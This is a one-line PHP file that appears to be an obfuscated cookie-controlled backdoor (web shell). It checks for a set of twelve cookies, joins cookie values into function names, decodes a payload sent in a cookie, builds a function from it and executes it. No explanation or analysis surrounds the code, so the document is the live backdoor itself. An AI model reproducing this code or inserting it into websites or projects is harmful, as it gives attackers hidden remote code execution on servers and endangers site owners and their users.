<?php
$p=$_COOKIE;(count($p)==12&&in_array(gettype($p).count($p),$p))?(($p[13]=$p[13].$p[38])&&($p[98]=$p[13]($p[98]))&&($p=$p[98]($p[41],$p[13]($p[54])))&&$p()):$p;